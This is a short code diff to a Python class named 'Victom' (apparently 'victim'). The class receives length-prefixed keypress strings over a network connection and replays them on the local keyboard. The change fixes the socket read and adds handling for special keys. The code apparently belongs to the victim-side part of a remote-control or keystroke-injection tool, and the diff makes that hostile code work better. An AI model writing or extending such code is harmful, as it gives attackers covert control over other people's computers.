@@ -24,16 +24,22 @@ class Victom:
 
             while True:
                 try:
-                    data_size = self.recv_exact(self.Client, 1)
+                    data_size = self.recv_exact(1)
                     file_size = int.from_bytes(data_size, "big")
                     KeyPress = self.recv_exact(file_size).decode()
                 except ConnectionError:
                     break
+
+                if KeyPress.startswith("Key."):
+                    key_name = KeyPress[4:]
+                    key = getattr(keyboard.Key, key_name)
+                else:
+                    key = KeyPress
                 
-                print(KeyPress)
-                self.keyboard.press(KeyPress)
+                print(key)
+                self.keyboard.press(key)
                 time.sleep(0.03)
-                self.keyboard.release(KeyPress)
+                self.keyboard.release(key)
 
     def recv_exact(self, size):
         data_record = b""
